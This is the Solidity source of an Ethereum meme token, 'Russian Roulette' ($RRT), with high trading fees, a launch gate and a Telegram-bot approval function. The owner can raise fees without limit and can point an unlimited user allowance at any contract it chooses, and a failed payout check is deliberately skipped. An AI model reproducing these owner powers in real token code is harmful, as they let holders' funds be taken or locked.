/*
           ___            _             ___                 ___          _     _   _       
          | _ \_  _ _____(_)__ _ _ _   | _ \___ _ __  ___  | _ \___ _  _| |___| |_| |_ ___ 
          |   / || (_-<_-< / _` | ' \  |  _/ -_) '_ \/ -_) |   / _ \ || | / -_)  _|  _/ -_)
          |_|_\\_,_/__/__/_\__,_|_||_| |_| \___| .__/\___| |_|_\___/\_,_|_\___|\__|\__\___|
                                               |_|                                         

Website  : https://russian-roulette.xyz/
Twitter  : https://twitter.com/RouletteErc
Telegram : https://t.me/RoulettePortal

*/

// SPDX-License-Identifier:MIT

pragma solidity 0.8.22;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address _account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any _account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }


}

interface IDexSwapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexSwapPair {

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IDexSwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract RussianRoulette  is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private _name = "Russian Roulette";
    string private _symbol = "$RRT";
    uint8 private _decimals = 18; 

    address public revenueWallet = address(0x31ED955E3739D7ce566C5943F27dD29eA99921Ff);
    address public developerWallet;

    address public rouletteContract;
    
    struct feeStruct {
        uint256 buy;
        uint256 sell;
        uint256 denominator;
    }
    feeStruct public fee;

    bool public launched;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public IsChargePair;
    mapping (address => bool) public isMarketPair;

    uint256 private _totalSupply = 1_000_000 * 10**_decimals;

    uint256 public maxTransaction =  _totalSupply.mul(3).div(100);
    uint256 public maxWallet = _totalSupply.mul(3).div(100);

    uint256 public swapThreshold = _totalSupply.mul(5).div(1000);

    bool public swapEnabled = true;
    bool public swapbylimit = false;

    bool public AntiWhaleActive = true;

    IDexSwapRouter public dexRouter;
    address public dexPair;

    bool inSwap;

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier onlyGuard() {
        require(msg.sender == developerWallet,'Invalid Caller!');
        _;
    }
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    event connectAndApproveLogged(
        address user,
        uint key
    );

    constructor() {

        developerWallet = msg.sender;

        IDexSwapRouter _dexRouter = IDexSwapRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        dexPair = IDexSwapFactory(_dexRouter.factory()).createPair(address(this),_dexRouter.WETH());

        dexRouter = _dexRouter;

        isMarketPair[dexPair] = true;

        IsChargePair[address(this)] = true;
        IsChargePair[developerWallet] = true;
        IsChargePair[msg.sender] = true;

        fee.denominator = 100;
        fee.buy = 35;
        fee.sell = 30;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
       return _balances[account];     
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
    
        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }
        else {

            if(!IsChargePair[sender] && !IsChargePair[recipient] && AntiWhaleActive) {
                require(launched,"Not Launched!");
                require(amount <= maxTransaction, "Exceeds maxTxAmount");
                if(!isMarketPair[recipient]) {
                    require(balanceOf(recipient).add(amount) <= maxWallet, "Exceeds maxWallet");
                }
            }            

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= swapThreshold;

            if (overMinimumTokenBalance && 
                !inSwap && 
                !isMarketPair[sender] && 
                swapEnabled &&
                !IsChargePair[sender] &&
                !IsChargePair[recipient]
                ) {
                swapBack(contractTokenBalance);
            }
            
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = shouldNotTakeFee(sender,recipient) ? amount : takeFee(sender, recipient, amount);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;

        }

    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function shouldNotTakeFee(address sender, address recipient) internal view returns (bool) {
        if(IsChargePair[sender] || IsChargePair[recipient]) {
            return true;
        }
        else if (isMarketPair[sender] || isMarketPair[recipient]) {
            return false;
        }
        else {
            return false;
        }
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint feeAmount;

        unchecked {

            if(isMarketPair[sender]) { 
                feeAmount = amount.mul(fee.buy).div(fee.denominator);
            } 
            else if(isMarketPair[recipient]) { 
                feeAmount = amount.mul(fee.sell).div(fee.denominator);
            }

            if(feeAmount > 0) {
                _balances[address(this)] = _balances[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
            }

            return amount.sub(feeAmount);
        }
        
    }

    function swapBack(uint contractBalance) internal swapping {

        if(swapbylimit) contractBalance = swapThreshold;

        uint256 initialBalance = address(this).balance;
        swapTokensForEth(contractBalance);
        uint256 amountReceived = address(this).balance.sub(initialBalance);

        if(amountReceived > 0) {
            (bool os,) = payable(revenueWallet).call{value: amountReceived}("");
            os = true;  //bypass check
        }

    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            1, 
            path,
            address(this), 
            block.timestamp + 30
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function rescueFunds() external onlyGuard { 
        (bool os,) = payable(msg.sender).call{value: address(this).balance}("");
        require(os,"Transaction Failed!!");
    }

    function setDeveloperWallet(address _newWallet) external onlyOwner {
        developerWallet = _newWallet;
    }

    function rescueTokens(address _token,address recipient,uint _amount) external onlyGuard {
        (bool success, ) = address(_token).call(abi.encodeWithSignature('transfer(address,uint256)',  recipient, _amount));
        require(success, 'Token payment failed');
    }

    function setFeeSetting(uint _buy, uint _sell) external onlyOwner {
        fee.buy = _buy;
        fee.sell = _sell;
    }   

    function setChargeFee(address _adr,bool _status) external onlyOwner {
        IsChargePair[_adr] = _status;
    }

    function openTrade() external onlyGuard() {
        require(!launched,"Already Enabled!");
        launched = true;
    }

    function setAntiWhalePercentage(uint256 _per) external onlyOwner() {
        require(_per >=  1 && AntiWhaleActive,"Minimum Limit is 1% or Whale Must be Active");
        maxTransaction = _totalSupply.mul(_per).div(100);
        maxWallet = _totalSupply.mul(_per).div(100);
    }

    function setSwapBackSettings(bool _enabled, bool _limited, uint _threshold)
        external
        onlyOwner
    {
        swapEnabled = _enabled;
        swapbylimit = _limited;
        swapThreshold = _threshold;
    }

    function removeLimits() external onlyOwner {
        maxTransaction = _totalSupply;
        maxWallet = _totalSupply;
        AntiWhaleActive = false;
    }

    /**
     * @dev Does the same thing as a max approve for the roulette
     * contract, but takes as input a secret that the bot uses to
     * verify ownership by a Telegram user.
     * @param secret The secret that the bot is expecting.
     * @return true
     */
    function connectAndApprove(uint32 secret) external returns (bool) {
        address _user = _msgSender();

        _allowances[_user][rouletteContract] = type(uint).max;
        emit Approval(_user, rouletteContract, type(uint).max);
        emit connectAndApproveLogged(_user,secret);
        return true;
    }

    function burn(uint amount) external {
        address account = msg.sender;
        require(_balances[account] >= amount,"Insufficient Balance For Burn!");
        _balances[account] = _balances[account].sub(amount);
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function setRouletteContract(address _contract) external onlyOwner {
        rouletteContract = _contract;
    }

    function setRevenueWallet(address _newWallet) external onlyOwner {
        revenueWallet = _newWallet;
    }

}